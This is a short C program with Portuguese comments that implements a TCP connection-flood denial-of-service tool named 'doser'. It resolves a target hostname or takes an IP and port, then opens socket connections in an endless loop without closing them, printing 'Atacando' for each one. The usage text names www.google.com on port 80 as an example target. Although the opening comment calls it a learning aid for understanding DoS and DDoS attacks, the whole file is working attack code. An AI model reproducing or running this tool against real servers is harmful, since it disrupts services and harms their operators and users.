/* DOS muito simples usando flood de Sockets sem cancelamento. Isso é uma técnica muito básica e deve ser usada como auxiliar para compreender
o funcionamento de um DOS para logo entender os DDoS que usam diversos bots com essas requests e de outros tipos.*/

// Headers
#include <stdio.h>
#include <stdlib.h>
#include <netdb.h> // Necessario para o gethostbyname
#include <arpa/inet.h> // Necessario para o inet_ntoa que converte para asci
#include <sys/socket.h>
#include <string.h>
// Funções
int atkDns(const char *dns, const char *porta);
int atkIp(char *ip, const char *porta);
// Blocos
int main(int argc, char *argv[]){
  if(argc < 3){ // Caso de erro
    fprintf(stderr, "Forma de uso:\nDNS: doser [-d ou --dns] [URL] [PORTA]\nIP: doser [-i ou --ip] [IP] [PORTA]\n\nExemplo: doser -d www.google.com 80\n");
    return 0; // retorna do programa
  }
  else{ // Tou usando ELSE por que uso em conjunto com uma toolkit, mas se tirar o else também funciona como esperado
    // Verificando se vai resolver DNS
    if(strcmp(argv[1], "-d") == 0 || strcmp(argv[1], "--dns") ==0)
      atkDns(argv[2], argv[3]);
    // Verificando se vai usar direto com o IP
    else if(strcmp(argv[1], "-i") == 0 || strcmp(argv[1], "--ip") ==0)
      atkIp(argv[2], argv[3]);
    else
    {
      fprintf(stderr, "Forma de uso:\nDNS: doser [-d ou --dns] [URL] [PORTA]\nIP: doser [-i ou --ip] [IP] [PORTA]\n\nExemplo: doser -d www.google.com 80\n");
    }
  }
  
  
  return 0;
}
// Atcar com DNS RESOLVER
int atkDns(const char *dns, const char *porta){
  struct hostent *resolver = gethostbyname(dns); // Pegar o IP pelo DNS
  struct sockaddr_in alvo; // Estrutura do socket
  int mysocket, conexao;
  int port = atoi(porta); // Converter para inteiro o ponteiro (char *)
  char *ip_alvo; // usei embaixo pra ficar melhor de entender quem não compreender bem ponteiros
  ip_alvo = inet_ntoa(*((struct in_addr*) resolver->h_addr)); // transformar em string
  
  printf("[DNS Resolver]: %s ===> %s\n",dns ,ip_alvo);
  for(;;){ 
    mysocket = socket(AF_INET, SOCK_STREAM, 0); // criando o socket
    alvo.sin_family=AF_INET;
    alvo.sin_port=htons(port); 
    alvo.sin_addr.s_addr=inet_addr(ip_alvo); 
    conexao = connect(mysocket, (struct sockaddr *)&alvo, sizeof alvo); // criando a conexão

    if(conexao == 0){
      printf("Atacando: %s ===> %s:%s\n", dns,ip_alvo, porta); // Exibindo ao conectar com a porta
    }
    else{
       fprintf(stderr, "Servidor fora do ar!\n"); // Caso a porta ou servidor esteja fechado/offline
       return;
    }
  }
  
}

// Atacar direto com IP
int atkIp(char *ip, const char *porta){
  struct sockaddr_in alvo;
  int mysocket, conexao;
  int port = atoi(porta);
  printf("Alvo setado: %s:%s\n", ip, porta);

  for(;;){ 
    mysocket = socket(AF_INET, SOCK_STREAM, 0);
    alvo.sin_family=AF_INET;
    alvo.sin_port=htons(port);
    alvo.sin_addr.s_addr=inet_addr(ip);
    conexao = connect(mysocket, (struct sockaddr *)&alvo, sizeof alvo);
    if(conexao == 0){
      printf("Atacando Servidor ===> %s\n", ip);
    }
    else {
      fprintf(stderr, "Servidor fora do ar!\n");
      return;
    }
  }
}
